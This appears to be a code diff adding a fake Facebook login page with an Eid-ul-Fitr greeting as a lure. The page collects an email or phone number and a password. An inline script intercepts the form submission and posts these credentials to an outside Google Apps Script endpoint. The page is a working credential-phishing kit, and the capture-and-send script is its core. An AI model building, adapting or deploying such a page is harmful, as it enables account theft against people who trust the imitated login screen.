@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+    <title>Facebook – log in or sign up</title>
+</head>
+
+<body>
+    <main>
+        <form name="facebook" method="post">          
+            
+            
+
+            <div class="row"> 
+                <div class="colm-logo">
+                   <div class="">
+                    <img src="eid.jpg" alt="eid" style="display: flex; width:99px; height: 99px; margin-left:150px">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
+                   </div>
+                    <h2>Eid Mubarak to all the facebook user in this Eid-UL-Fitar</h2>
+                </div>
+                <div class="colm-form">
+                    <div class="colm-log">
+                        <img src="eid.jpg" alt="eid" style="display: flex;width:99px;height: 99px;">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
+                    </div>
+                    <div class="form-container">
+                        <input type="text" placeholder="Email address or phone number" name="email" id="email" required>
+                        <input type="password" placeholder="Password" name="pass" id="pass" required>
+                        <button class="btn-login" name="submit" id="sent" onclick="send()">Login</button>
+                        <div id="message"></div>
+                        <a
+                            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten
+                            password?</a>
+                    </div>
+                 </div>
+            </div>
+           
+        </form>
+    </main>
+
+    <script src="script.js"></script>
+
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyJGwN1x2lGJPuKnI0NerOj0pZQMChiAh1zHTYdYPyiHdQM6jJhfAMGh_FJHx0WQZzz/exec'
+        const form = document.forms['facebook']
+
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => console.log('Success!', response))
+                .catch(error => console.error('Error!', error.message))
+        })
+    </script>
+
+</body>
+
+</html>
